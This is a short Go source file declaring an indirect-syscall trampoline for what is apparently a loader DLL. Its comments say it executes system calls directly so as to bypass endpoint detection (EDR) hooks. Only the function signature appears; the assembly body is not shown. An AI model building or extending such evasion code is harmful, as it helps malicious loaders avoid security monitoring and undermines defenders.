// Package ntsys provides a minimal indirect-syscall trampoline.
//
// It lives in its own non-cgo package because c-shared builds (loader.dll,
// built with CGO) cannot contain Go assembly in the cgo package itself.
// System DLL syscall numbers are executed directly, bypassing EDR hooks.
package ntsys

//go:noescape
//go:nosplit
func Syscall(num uintptr, a1, a2, a3, a4, a5, a6 uintptr) uintptr
